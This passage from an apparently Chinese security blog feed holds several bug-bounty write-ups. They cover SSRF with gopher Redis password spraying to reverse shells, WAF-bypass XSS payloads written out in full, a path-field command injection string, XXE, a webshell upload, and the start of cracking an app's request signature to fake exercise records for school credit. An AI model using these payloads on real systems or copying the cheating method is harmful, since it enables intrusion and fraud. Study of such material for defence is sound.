<strong>是的，生者挥霍的时光，正是死者苦苦的奢望。</strong></p><p>纵观二者，无论是苏轼还是赵英俊，虽然诗词歌赋领域并不相通，但他们在面对人生的沉浮，生与死之时，都表现出了相当程度的释然，我愿把这称为一种相当高的人生层次。<strong>和江河湖海，山川五岳比，人生无疑是须臾的，但对此选择释然与接受，努力活出生命的深度和高度，着实是一件让人肃然起敬的事情。</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318123.png" alt="图片"></p><p><strong>“长恨此身非我有，何时忘却营营。夜阑风静縠纹平，小舟从此逝，江海寄余生”</strong></p><p>  苏轼在心灵突围之时饱经痛苦与挣扎，最终得以突围成功。正是那对于人生与生命的高层次理解与顿悟、渊博的学识、睿智的思想、高尚的人格、丰富的人生经历、多方面的巨大成就才让他终成为中国文化史上的旷世奇才，文学巨子。</p><p>  <strong>因此，苏轼之于后人最大的意义，除了极高水平的文学作品外，还有他那对于生命的哲思。</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318123.png" alt="图片"></p><p><strong>“在某个角落，也许真的有这首歌，如果你听过，会不会想起我”</strong></p><p>赵英俊抗癌两年，最终遗憾落败，但他留下的歌曲，动听依旧，给予每一位听众前行的力量，某个角落，听到这首歌，我想我会永远记起他。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318267.jpeg" alt="图片"></p><p>所以，这首《世界上不存在的歌》，让我意识到——</p><p><strong>人的伟大之处在于：我们明知死亡会是最终的胜利者，但仍能努力经营自己的生活。</strong></p><p><strong>把自己的热爱变成一个和成千上万的人分享快乐的事业，让这世界变得更加安全、动人而又温暖，可谓人生第一值得之事。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活偶悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(六)-强行多次FUZZ发现某厂商SSRF到redis密码喷洒批量反弹Shell</title>
      <link href="/2021/12/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%85%AD-%E5%BC%BA%E8%A1%8C%E5%A4%9A%E6%AC%A1FUZZ%E5%8F%91%E7%8E%B0%E6%9F%90%E5%8E%82%E5%95%86SSRF%E5%88%B0redis%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%89%B9%E9%87%8F%E5%8F%8D%E5%BC%B9Shell/"/>
      <url>/2021/12/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%85%AD-%E5%BC%BA%E8%A1%8C%E5%A4%9A%E6%AC%A1FUZZ%E5%8F%91%E7%8E%B0%E6%9F%90%E5%8E%82%E5%95%86SSRF%E5%88%B0redis%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%89%B9%E9%87%8F%E5%8F%8D%E5%BC%B9Shell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-对目录批量FUZZ，发现一处隐蔽接口"><a href="#0x01-对目录批量FUZZ，发现一处隐蔽接口" class="headerlink" title="0x01 对目录批量FUZZ，发现一处隐蔽接口"></a>0x01 对目录批量FUZZ，发现一处隐蔽接口</h2><p>挖某大厂已经挖了快两个周了，期间因为公司业务比较繁忙，最近一直没挖。</p><p>但是一直在用ffuf挂着字典对厂商资产进行批量目录扫描，今天上服务器看了下扫描结果，就出货了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216563.png" alt="image-20211224185734645"></p><p>接口地址为：<a href="https://xxx.xxxx.com/xxxx/start">https://xxx.xxxx.com/xxxx/start</a></p><p>我们直接对其进行访问</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216903.png" alt="image-20211224190001535"></p><p>发现该接口给我们提供了一些可以使用的接口链接</p><p>我们逐个测试拼接接口后，发现一个名为face_xxxx的接口有戏</p><h2 id="0x02-FUZZ传参格式-参数"><a href="#0x02-FUZZ传参格式-参数" class="headerlink" title="0x02 FUZZ传参格式+参数"></a>0x02 FUZZ传参格式+参数</h2><p>访问接口，提示Method Not Allow，405错误，那么很显然，我们得换POST传参</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216051.png" alt="image-20211224190757303"></p><p>POST随便传个参过去，发现接口提示”Request error, content-type was unsupported”</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216439.png" alt="image-20211224191101242"></p><p>很好，继续FUZZ content-type header(记得把payload_processing自动编码给关掉)</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216538.png" alt="image-20211224192131756"></p><p>FUZZ出来application&#x2F;json的content-type头可用，那么很简单了，构造JSON数据，继续FUZZ JSON数据参数</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216253.png" alt="image-20211224192458939"></p><h2 id="0x03-SSRF无脑到手"><a href="#0x03-SSRF无脑到手" class="headerlink" title="0x03 SSRF无脑到手"></a>0x03 SSRF无脑到手</h2><p>参数为image_url，稍有经验的朋友就可以借此判断出，很可能这个参数是加载远程图片的</p><p>直接进行SSRF测试</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216847.png" alt="image-20211224193009475"></p><p>服务器收到了请求，经测试gopher，dict，http等常规协议都可以使用~</p><p>之前通过各种域名二级目录或根目录的spring泄露，下载heapdump，OQL调试出redis明文密码</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216281.jpg" alt="image-20220306153718729"></p><p>收集了不少该厂商内网redis的ip和密码，也了解到该厂商的内网网段</p><p>尝试利用本处SSRF完全可以批量对内网Redis进行密码喷洒+反弹shell对边界进行突破</p><h2 id="0x04-利用gopher协议对内网脆弱网段批量Redis密码喷洒反弹Shell"><a href="#0x04-利用gopher协议对内网脆弱网段批量Redis密码喷洒反弹Shell" class="headerlink" title="0x04 利用gopher协议对内网脆弱网段批量Redis密码喷洒反弹Shell"></a>0x04 利用gopher协议对内网脆弱网段批量Redis密码喷洒反弹Shell</h2><p>普及一个知识：与未授权直接访问的redis不同，加入密码认证的redis在命令行链接时会多一个-a参数指定密码</p><p>如图所示如果不传参密码，则无法执行任何redis指令<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216420.png" alt="image"></p><p>而加入密码认证后redis，在整个RESQ协议流量中表现如下<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216485.png" alt="image"></p><p>认证过程中会多一个Auth</p><p>写脚本来构造gopher数据，注意把这块Auth加上,后续常规操作写计划任务反弹SHELL</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216507.png" alt="image"></p><p>利用上面挖掘到的SSRF点，配合之前自己收集到的内网redis密码和脆弱网段</p><p>直接通过intruder批量跑内网的脆弱网段redis，进行密码喷洒，喷洒一但成功，则会写入计划任务</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217584.png" alt="image-20230419221700540"></p><p>最终功夫不负有心人，在一个网段，弹回来了十几个Shell。。。</p><p>厂商的内网Redis主机还能出网，属实是内网安全做的稀烂了。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216585.png" alt="image"></p><h2 id="0x04-后言"><a href="#0x04-后言" class="headerlink" title="0x04 后言"></a>0x04 后言</h2><p>这个洞是在平安夜挖到的~算是圣诞贺礼啦</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(五)-多手法绕过WAF挖掘某知名厂商XSS</title>
      <link href="/2021/12/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%BA%94-%E5%A4%9A%E6%89%8B%E6%B3%95%E7%BB%95%E8%BF%87WAF%E6%8C%96%E6%8E%98%E6%9F%90%E7%9F%A5%E5%90%8D%E5%8E%82%E5%95%86XSS/"/>
      <url>/2021/12/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%BA%94-%E5%A4%9A%E6%89%8B%E6%B3%95%E7%BB%95%E8%BF%87WAF%E6%8C%96%E6%8E%98%E6%9F%90%E7%9F%A5%E5%90%8D%E5%8E%82%E5%95%86XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前奏"><a href="#0x01-前奏" class="headerlink" title="0x01 前奏"></a>0x01 前奏</h2><p>最近在测试某知名安全厂商的过程中，发现其一处重要业务的子域竟出现了难得一见的自研WAF，如此一来勾起了我的兴趣~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214230.png" alt="image-20230419221229711"></p><p>仔细研究该业务点后，发现某处传参，会直接将传参内容写入JS中，大大的危险</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214677.png" alt="image-20230419221243010"></p><p>于是与WAF的一次交锋便从此刻开始~</p><h2 id="0x02-平静的闭合与常规操作"><a href="#0x02-平静的闭合与常规操作" class="headerlink" title="0x02 平静的闭合与常规操作"></a>0x02 平静的闭合与常规操作</h2><p>由上图的输出位置可知，无WAF情况下，我们只需要通过</p><pre><code class="js">’)]</code></pre><p>三个符号来闭合前半部分JS，再用&#x2F;&#x2F;注释后方JS，再直接eval执行JS代码即可</p><p>构造Payload</p><pre><code class="js">%27)];eval(alert(&#39;xss&#39;))//</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214040.png" alt="image-20230419221253870"></p><p>由于eval，alert，括号等太敏感~毫无疑问，直接被WAF秒了</p><p>那只能用经验与思路来逐渐替换掉这些敏感的函数关键词了~</p><h2 id="0x03-多手法组合绕过WAF"><a href="#0x03-多手法组合绕过WAF" class="headerlink" title="0x03 多手法组合绕过WAF"></a>0x03 多手法组合绕过WAF</h2><h3 id="解决eval"><a href="#解决eval" class="headerlink" title="解决eval"></a>解决eval</h3><p>首先解决的是eval被拦截的问题</p><p>在JS中绕过对于eval的拦截，可以使用Function()动态构造函数</p><p>这里用到了 Function()构造函数的一个特性, Function()构造函数虽然不是很常用，但是了解一下还是很有必要的。</p><p>不管是通过函数定义语句还是函数直接量表达式，函数的定义都要使用 function()关键字。</p><p>但是单函数还可以通过Function()构造函数来定义，比如：</p><pre><code class="js">var f = new Function(&quot;x&quot;,&quot;y&quot;,&quot;return x*y&quot;);</code></pre><p>这一行的实际效果和下面的一行代码是等价的。</p><pre><code class="js">var f=function(x,y)&#123;x*y&#125;;</code></pre><p>Function()构造函数可以传入任意数量的字符串实参，最后一个实参所表示的文本是函数体；它可以包含任意的Javascript 语句，每条语句之间用分号分割。</p><p>我们依据这个特性就可以使用Function()来代替eval()</p><p>EG:</p><pre><code class="js">Function(alert(&#39;xss&#39;))</code></pre><pre><code>eval(alert(&#39;xss&#39;))</code></pre><p>两者是等效的</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214276.png" alt="image-20230419221311737"></p><p>改造我们的Payload</p><pre><code>?%27]);Function(test)()//</code></pre><p>发现未拦截</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214464.png" alt="image-20230419221323981"></p><p>直接Function内使用函数</p><pre><code class="js">%27]);Function(alert(&#39;xss&#39;))()//</code></pre><p>不出意外，直接GG了~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214702.png" alt="image-20230419221343757"></p><p>下面思考的就是如何绕过对于函数的检测</p><h3 id="绕过函数检测"><a href="#绕过函数检测" class="headerlink" title="绕过函数检测"></a>绕过函数检测</h3><p>直接alert既然被拦截，我们就使用atob来解密base64的的JS</p><p>EG:</p><pre><code class="js">atob(&quot;YWxlcnQoInhzcyIp&quot;)  //base64编码的alert(&#39;xss&#39;)</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214898.png" alt="image-20230419221354879"></p><p>构造Payload</p><pre><code class="JS">%27]);Function(atob(&#39;YWxlcnQoInhzcyIp&#39;)))()//</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214084.png" alt="image-20230419221405330"></p><p>Md,又寄了~估计是正则检测了atob + ()的函数使用…</p><p>没事，再用JS的一个特性，反引号来代替括号＋引号</p><pre><code class="js">atob`YWxlcnQoInhzcyIp`</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214355.png" alt="image-20230419221415346"></p><p>构造Payload</p><pre><code class="js">%27]);Function(atob`YWxlcnQoInhzcyIp`)()//</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214509.png" alt="image-20230419221427174"></p><p>弹弹弹，弹走鱼尾纹</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本初XSS绕过WAF总共用了四个简单的TIPS</p><p>1.输出在JS内的闭合与注释</p><p>2.Function()来代替eval()</p><p>3.atob解密base64加密的JS</p><p>4.反引号代替括号与引号</p><p>所以，大多数业务场景并不是没有漏洞，大部分情况是受挖掘者脑中的利用链与姿势所限。</p><p>各种小手法组合起来达到漏洞利用成功的效果，是一次有趣的经历。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(四)-记一次有趣的客户端RCE+服务端XXE挖掘</title>
      <link href="/2021/12/21/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%9B%9B-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AFRCE-%E6%9C%8D%E5%8A%A1%E7%AB%AFXXE%E6%8C%96%E6%8E%98/"/>
      <url>/2021/12/21/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%9B%9B-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AFRCE-%E6%9C%8D%E5%8A%A1%E7%AB%AFXXE%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h2><p>朋友给某甲方做渗透测试，奈何甲方是某知名保险，系统太耐艹，半天不出货</p><p>兄弟喊我来一块来看，于是有了本文</p><h2 id="0x02-客户端RCE一处"><a href="#0x02-客户端RCE一处" class="headerlink" title="0x02 客户端RCE一处"></a>0x02 客户端RCE一处</h2><p>朋友把靶标发给我看了下，除了两个下载链接啥也没有</p><p><a href="https://s2.loli.net/2021/12/21/8hKoUZP1etXN2Si.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142157.png" alt="img"></a></p><p>链接下载下来的东西如图，看了下目录里面还有JRE，那么很显然，这客户端exe就是个JAVA启动命令执行套壳</p><p><a href="https://s2.loli.net/2021/12/21/e1DOnsSfbil6HZN.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142831.png" alt="img"></a></p><p>随后打开program文件夹，逆了一下里面的Jar</p><p>full_path前面定义为用户更新时输入的路径</p><p><a href="https://s2.loli.net/2021/12/21/GowTki89rcO3UMK.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142221.png" alt="img"></a></p><p>那么很简单了full_path可控，诱导用户安装更新时路径出输入注入命令即可</p><pre><code class="vbnet">D:\software  &amp;&amp; ping hacker&#39;s IP</code></pre><p><a href="https://s2.loli.net/2021/12/21/2hW4KzEODkfYypd.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192145028.png" alt="img"></a></p><h2 id="0x03-发现Webservice-Soap接口"><a href="#0x03-发现Webservice-Soap接口" class="headerlink" title="0x03 发现Webservice Soap接口"></a>0x03 发现Webservice Soap接口</h2><p>光这一个水来的客户端RCE肯定是不够的，接下来继续挖掘服务端</p><p>看了看没别的功能点，我就简单FUZZ了一下这个系统三级目录</p><p><a href="https://s2.loli.net/2021/12/21/4Vlu8vpcxKQJh16.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142659.png" alt="img"></a></p><p>最后FUZZ出来了一个webservice接口</p><p>http:&#x2F;&#x2F;****.xxxxxx.cn&#x2F;xxxx&#x2F;service</p><p><a href="https://s2.loli.net/2021/12/21/y9ZMhRDnfScHjLw.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142315.png" alt="img"></a></p><p>拼接出其wsdl接口</p><p>http:&#x2F;&#x2F;****.xxxxxx.cn&#x2F;xxxx&#x2F;service&#x2F;BusinessService?wsdl</p><p>但导入SoapUI或AWVS的调试模块进行调试时却发现其导入失败</p><p><a href="https://s2.loli.net/2021/12/21/NI9qyGLPTciphbn.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142655.png" alt="img"></a></p><p>仔细看了下WSDL返回的信息。。。妈的WSDL Import Location和Soap Address Location都是内网域名</p><p><a href="https://s2.loli.net/2021/12/21/F3ijQ4PEH95ksD2.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142373.png" alt="img"></a></p><p>不过幸运的是，该系统的外网域名拼接路径后也可以访问到这个WSDL接口</p><p>但是自动化的Soap接口调试工具是“看见什么就import什么”，这可让人犯了难</p><h2 id="0x04导入SoapUI"><a href="#0x04导入SoapUI" class="headerlink" title="0x04导入SoapUI"></a>0x04导入SoapUI</h2><p>思考了一会，突然想起来BurpSuite可以把RequestBody和ResponseBody的值进行替换，hhh，那我们就有办法导入了</p><p>在Burpsuite的Porxy Option中增加Match&amp;Replace规则</p><p>将WSDL Import Location和Soap Address Location处对应的内网域名都替换为外网域名</p><p><a href="https://s2.loli.net/2021/12/21/whrn98TC7kbJZ6Q.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142262.png" alt="img"></a></p><p>随后在SoapUI中设置Proxy</p><p><a href="https://s2.loli.net/2021/12/21/iEwOydTQM4tYVGh.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142058.png" alt="img"></a></p><p>打开代理，再次添加WSDL，ResponseBody的内网域名成功被替换，WSDL导入成功~</p><p><a href="https://s2.loli.net/2021/12/21/IvfRJ9Y5doPpLWy.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142963.png" alt="img"></a></p><h2 id="0x05-XXE挖掘"><a href="#0x05-XXE挖掘" class="headerlink" title="0x05 XXE挖掘"></a>0x05 XXE挖掘</h2><p>导入接口后，发现有参数为dataXML，心中暗喜XXE估计是送上门了</p><p><a href="https://s2.loli.net/2021/12/21/utaD2qUYXIfZ968.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142408.png" alt="img"></a></p><p>直接BurpSuite中利用XXE OOB测试</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142925.jpg" alt="image-20220306152639003"></p><p>OOB成功，XXE到手，收摊~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142372.jpg" alt="image-20220604155438953"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>坚持一下，守得云开见月明，漏洞就在眼前~</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(三)-无脑挖掘某SRC getshell</title>
      <link href="/2021/11/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%B8%89-%E6%97%A0%E8%84%91%E6%8C%96%E6%8E%98%E6%9F%90SRC-getshell/"/>
      <url>/2021/11/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%B8%89-%E6%97%A0%E8%84%91%E6%8C%96%E6%8E%98%E6%9F%90SRC-getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x02-资产收集到脆弱系统"><a href="#0x02-资产收集到脆弱系统" class="headerlink" title="0x02 资产收集到脆弱系统"></a>0x02 资产收集到脆弱系统</h2><p>在某数字厂src挖掘过程中，本人通过ssl证书对域名资产进行了收集，通过计算域名对应ip段的权重</p><p>整理出其资产集中的C段，并进行了批量测活+目录扫描</p><p>查看目录扫描结果后，发现了一个有趣的文件</p><p><a href="http://0.0.0.36/">http://36</a>.x.x.x&#x2F;upload_image.php<br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212519726-640468616.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139184.png" alt="img"></a></p><p>对于这种页面，毫无疑问，要对参数进行FUZZ</p><h2 id="0x03-FUZZ参数-表单上传"><a href="#0x03-FUZZ参数-表单上传" class="headerlink" title="0x03 FUZZ参数+表单上传"></a>0x03 FUZZ参数+表单上传</h2><p>使用arjun工具对其参数进行fuzz，发现了一个参数字段为do</p><p>随后在burpsuite中对do的参数值进行fuzz<br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212707411-781011341.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139305.png" alt="img"></a></p><p>成功fuzz出一个do的参数值，upload<br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212735232-190611207.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139410.png" alt="img"></a></p><p>构造url<br><a href="http://36.x.x.x/upload_image.php?do=upload%EF%BC%8C%E6%88%90%E5%8A%9F%E5%87%BA%E7%8E%B0%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95">http://36.x.x.x/upload_image.php?do=upload，成功出现上传表单</a><br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212755371-1273545490.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139544.png" alt="img"></a></p><p>webshell名skr_anti.php</p><p>选择我们的webshell直接上传</p><p>上传后fuzz上传路径</p><pre><code class="perl">http://36.*.*.*/upload  --------&gt;  403继续fuzzhttp://36.*.*.*/upload/images  --------&gt;  403构造urlhttp://36.*.*.*/upload/images/skr_anti.php</code></pre><p><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212902701-2023108540.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139700.png" alt="img"></a></p><p>喜提一个严重</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>我说这个漏洞有手就行，大家应该没意见吧</p><p>综合来说学习思路点如下：</p><p>1.遇到空白敏感页面&#x2F;api，FUZZ参数和参数值</p><p>2.上传没返回路径不要慌，努力去FUZZ</p><p>3.SRC测试的时候不要上传webshell，传phpinfo等验证code就行，不然会被降赏金，我就是吃了哑巴亏。。</p><p>4.资产收集是红队还有渗透测试的核心</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(二)-逆向app破解数据包sign值实现任意数据重放添加</title>
      <link href="/2021/10/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%BA%8C-%E9%80%86%E5%90%91app%E7%A0%B4%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%8C%85sign%E5%80%BC%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%95%B0%E6%8D%AE%E9%87%8D%E6%94%BE%E6%B7%BB%E5%8A%A0/"/>
      <url>/2021/10/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%BA%8C-%E9%80%86%E5%90%91app%E7%A0%B4%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%8C%85sign%E5%80%BC%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%95%B0%E6%8D%AE%E9%87%8D%E6%94%BE%E6%B7%BB%E5%8A%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>本文首发奇安信攻防社区，作者J0o1ey，大家可以多多支持奇安信攻防社区哦，技术氛围浓厚，作者待遇优厚~</p><p>本期登场的目标虽不是SRC，但是整个漏洞的利用手法很有学习意义。<strong>目前在很多大厂的http数据包中都会添加sign值对数据包是否被篡改进行校验，而sign算法的破解往往是我们漏洞测试的关键所在~</strong></p><p>本人在一些漏洞挖掘实战中<strong>经常发现在破解sign值后，在测试各类越权，重放等漏洞时一马平川</strong></p><p>今天特此为大家带来这样一个精彩的实战案例。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134573.jpg"></p><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>学校每学期的体育成绩中会有10％来源于某跑步APP的打卡数据，本人作为一个<strong>体测只能勉强及格</strong>的废物，自然得想办法拿到这10分，以防挂科</p><p>无奈这个app后台设置的是每学期男生总共要求跑120公里才能完整地拿到10分，非常恶心。</p><p>一学期跑120公里，你还不如鲨了我，于是便有了此文对于其app的crack</p><h2 id="0x02-初步测试"><a href="#0x02-初步测试" class="headerlink" title="0x02 初步测试"></a>0x02 初步测试</h2><p>手机装好https证书，挂好Burpsuite的代理，随后我们直接去抓取该APP上传校园跑步数据时的请求<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134858.png" alt="跑步数据上传解密"></p><p>请求如下</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134145.png" alt="跑步数据请求"></p><p>我们发现单次跑步距离对应的POST参数为FormatSportRange，自然二话不说对其进行修改，将0.000修改为5.000</p><p>此时悲剧发生了，直接提示认证失败~</p><p>定神细看，发现POST数据末尾有sign签名….</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134373.png" alt="报文末尾sign签名"></p><p>此时老开发或老安全肯定就知道发生甚么事了，为了让本文对新手友好一些，下面简单讲一下sign校验手法</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134482.jpg"></p><h2 id="0x03-何为Sign签名校验？"><a href="#0x03-何为Sign签名校验？" class="headerlink" title="0x03 何为Sign签名校验？"></a>0x03 何为Sign签名校验？</h2><p><strong>Sign签名校验法本质上是对客户端传输数据合法性的一种校验手段</strong></p><p><strong>其常用手法为，在用户客户端传输的数据中额外加上时间戳以及特殊字符，随后一起得出整体数据的加密值(常用MD5,SHA1等加密算法)</strong></p><p><strong>这就导致了用户在不知晓程序的原始数据生成sign值的方法情况下，若对传输到服务端的数据进行篡改，在后端都会鉴权失败，导致用户篡改后的数据无效。</strong></p><h2 id="0x04-sign值的安全对抗方法"><a href="#0x04-sign值的安全对抗方法" class="headerlink" title="0x04 sign值的安全对抗方法"></a>0x04 sign值的安全对抗方法</h2><p>针对有sign签名值的数据包，本人常用的测试手法有两个：</p><p><strong>1.检测sign值是否为弱凭据</strong></p><p><strong>2.检测sign值是否可以置空</strong></p><p><strong>第一种类型通常有两种情况</strong></p><p><strong>①看sign值是否采用了一些弱加密&#x2F;编码方法(例如base64)，我们解码后可以直接看到sign的原始数据。</strong></p><p><strong>②测试sign值是否为时间戳&#x2F;随机数加密后的密文值，在一些实战情况中，很多厂商安全开发意识不足，会将sign值的算法直接暴露在前端未加密的js中，或者直接将用户进行某操作的时间戳进行md5加密后作为sign凭据，导致sign凭据在一段时间内可以通过遍历时间戳进行猜解</strong></p><p><strong>第二种类型就比较好理解，我们直接将sign参数以及值删掉，看后端程序是否可以不校验sign直接执行我们传输的数据</strong></p><p>上述概念可能看起来比较抽象，下面我们继续来看本案例</p><h2 id="0x05-二次测试"><a href="#0x05-二次测试" class="headerlink" title="0x05 二次测试"></a>0x05 二次测试</h2><p>我们先尝试第一种方法，上方添加跑步记录获取到的sign值为<strong>5ded7f11f080fb5a9d403c9d0963ebaa</strong></p><p>拿眼一看，大概率sign值是使用md5加密的，我们随后对其进行解密</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134572.png" 